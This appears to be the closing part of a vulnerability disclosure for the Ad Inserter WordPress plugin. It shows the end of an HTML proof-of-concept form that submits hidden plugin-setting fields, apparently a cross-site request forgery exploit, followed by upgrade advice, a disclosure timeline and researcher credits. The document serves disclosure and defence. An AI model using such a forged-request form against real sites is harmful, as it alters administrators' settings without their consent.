      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad13&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad13&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad13&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad13&#95;block&#95;user" value="" />
      <input type="hidden" name="ad13&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad13&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad13&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad13&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad13&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad13&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad13&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad13&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad13&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad13&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad14&#95;name" value="Block&#32;14" />
      <input type="hidden" name="ad14&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad14&#95;data" value="" />
      <input type="hidden" name="ad14&#95;displayType" value="None" />
      <input type="hidden" name="ad14&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad14&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad14&#95;floatType" value="None" />
      <input type="hidden" name="ad14&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad14&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad14&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad14&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad14&#95;block&#95;user" value="" />
      <input type="hidden" name="ad14&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad14&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad14&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad14&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad14&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad14&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad14&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad14&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad14&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad14&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad15&#95;name" value="Block&#32;15" />
      <input type="hidden" name="ad15&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad15&#95;data" value="" />
      <input type="hidden" name="ad15&#95;displayType" value="None" />
      <input type="hidden" name="ad15&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad15&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad15&#95;floatType" value="None" />
      <input type="hidden" name="ad15&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad15&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad15&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad15&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad15&#95;block&#95;user" value="" />
      <input type="hidden" name="ad15&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad15&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad15&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad15&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad15&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad15&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad15&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad15&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad15&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad15&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="ad16&#95;name" value="Block&#32;16" />
      <input type="hidden" name="ad16&#95;process&#95;php" value="0" />
      <input type="hidden" name="ad16&#95;data" value="" />
      <input type="hidden" name="ad16&#95;displayType" value="None" />
      <input type="hidden" name="ad16&#95;display&#95;for&#95;users" value="all" />
      <input type="hidden" name="ad16&#95;display&#95;for&#95;devices" value="all" />
      <input type="hidden" name="ad16&#95;floatType" value="None" />
      <input type="hidden" name="ad16&#95;custom&#95;css" value="" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;post" value="0" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;post" value="1" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;page" value="0" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;home" value="0" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;home" value="1" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;category" value="0" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;category" value="1" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;search" value="0" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;search" value="1" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;archive" value="0" />
      <input type="hidden" name="ad16&#95;widget&#95;settings&#95;archive" value="1" />
      <input type="hidden" name="ad16&#95;after&#95;day" value="0" />
      <input type="hidden" name="ad16&#95;general&#95;tag" value="gadgets" />
      <input type="hidden" name="ad16&#95;block&#95;user" value="" />
      <input type="hidden" name="ad16&#95;domain&#95;list&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad16&#95;block&#95;cat" value="" />
      <input type="hidden" name="ad16&#95;block&#95;cat&#95;type" value="Black&#32;List" />
      <input type="hidden" name="ad16&#95;minimum&#95;paragraphs" value="0" />
      <input type="hidden" name="ad16&#95;paragraph&#95;text" value="" />
      <input type="hidden" name="ad16&#95;paragraphNumber" value="0" />
      <input type="hidden" name="ad16&#95;directionType" value="From&#32;Top" />
      <input type="hidden" name="ad16&#95;excerptNumber" value="0" />
      <input type="hidden" name="ad16&#95;enable&#95;manual" value="0" />
      <input type="hidden" name="ad16&#95;enable&#95;php&#95;call" value="0" />
      <input type="hidden" name="adH&#95;process&#95;php" value="0" />
      <input type="hidden" name="adH&#95;data" value="" />
      <input type="hidden" name="adH&#95;enable" value="0" />
      <input type="hidden" name="adF&#95;process&#95;php" value="0" />
      <input type="hidden" name="adF&#95;data" value="" />
      <input type="hidden" name="adF&#95;enable" value="0" />
      <input type="hidden" name="syntax&#45;highlighter&#45;theme" value="ad&#95;inserter" />
      <input type="hidden" name="block&#45;class&#45;name" value="code&#45;block" />
      <input type="hidden" name="ai&#45;active&#45;tab" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


Mitigation 
==========
Update to Latest version 1.5.3

Change Log
==========
https://wordpress.org/plugins/ad-inserter/changelog/

Disclosure 
==========
18-April-2015 Reported to Developer
2-may-2015 	  Fixed By Developer
credits
=======
* Kaustubh Padwad 
* Information Security Researcher
* kingkaustubh (at) me (dot) com 
* https://twitter.com/s3curityb3ast
* http://breakthesec.com
* https://www.linkedin.com/in/kaustubhpadwad
